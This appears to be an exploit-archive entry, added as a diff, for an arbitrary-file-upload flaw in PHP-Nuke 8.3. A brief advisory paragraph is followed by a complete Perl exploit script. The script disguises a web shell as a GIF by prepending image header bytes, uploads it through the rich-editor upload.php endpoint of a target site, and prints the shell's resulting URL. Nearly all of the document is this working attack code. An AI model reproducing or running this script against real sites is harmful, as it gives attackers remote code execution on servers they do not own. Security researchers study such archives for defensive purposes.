@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/48257/info
+ 
+Phpnuke is prone to an arbitrary-file-upload vulnerability because the application fails to adequately sanitize user-supplied input.
+ 
+An attacker can exploit this issue to upload arbitrary code and run it in the context of the webserver process.
+ 
+Phpnuke 8.3 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/perl
+###################################################
+#//Iranian Pentesters Home
+#//PHP Nuke 8.3 MT AFU Vulnerability
+#//Coded by:4n0nym0us & b3hz4d
+#//http://www.pentesters.ir
+###################################################
+
+
+use LWP;
+use HTTP::Request::Common;
+print "\n" . "///////////////////////////////////" ."\n";
+print "     Iranian Pentesters Home" . "\n";
+print " PHP Nuke 8.3 MT AFU Vulnerability" . "\n";
+print "///////////////////////////////////" ."\n";
+print "\n" . "Syntax: perl xpl.pl http://your-target.com shell.php.01 [prefix]" . "\n\n";
+my $url   = $ARGV[0]."/includes/richedit/upload.php";
+my $filename = $ARGV[1];
+my $prefix = $ARGV[2];
+my $rfile = $prefix . $filename . ".gif";
+open fhandle, $ARGV[1] or die $!; 
+while (<fhandle>){
+$shell .= $_;
+}
+close fhandle;
+open fhandle, ">", $rfile or die $!;
+print fhandle "\x47\x49\x46\x38\x39\x61\x05\x00\x05\x00"."\n".$shell;
+close(fhandle);
+my $ua = LWP::UserAgent->new;
+$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.12) Gecko/20101026");
+my $req = POST $url, Content_Type => 'form-data',
+	Content      => [
+		upload => "1",
+		path => 'images',
+		pwd => "1",
+		userfile =>  [ $rfile,$prefix . $filename ]
+	];
+my $res = $ua->request($req);
+$between=substr($res->as_string(), index($res->as_string(), '<img src="upload/')+10, index($res->as_string(), 'onclick="self.parent.') - index($res->as_string(), '<img src="upload/')-12);
+print("Uploaded File: " . $ARGV[0]."/includes/richedit/".$between);
+exit;
